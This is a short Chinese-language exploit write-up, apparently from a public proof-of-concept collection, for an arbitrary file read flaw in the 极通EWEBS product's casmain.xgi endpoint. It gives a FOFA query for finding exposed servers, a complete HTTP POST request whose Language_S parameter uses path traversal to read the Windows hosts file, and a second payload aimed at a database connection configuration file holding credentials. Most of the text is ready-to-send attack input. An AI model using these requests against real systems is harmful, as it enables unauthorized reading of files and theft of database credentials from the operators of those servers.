# 极通EWEBS-casmain.xgi-任意文件读取漏洞

## 漏洞描述

极通EWEBS-casmain.xgi-任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

> [!NOTE]
>
> 极通EWEBS

## FOFA

> [!NOTE]
>
> app="新软科技-极通EWEBS"

## 漏洞复现

登录页面如下

![image-20210615125923544](极通EWEBS-casmain.xgi-任意文件读取漏洞.assets/1627363115100397.jpg)

漏洞请求包为

```
POST /casmain.xgi HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN
Content-Length: 57

Language_S=../../../../windows/system32/drivers/etc/hosts
```

![image-20210615130137932](极通EWEBS-casmain.xgi-任意文件读取漏洞.assets/1627363115432296.jpg)

可以配合 testweb.php 信息泄露读取敏感信息

```
Language_S=../../Data/CONFIG/CasDbCnn.dat
```

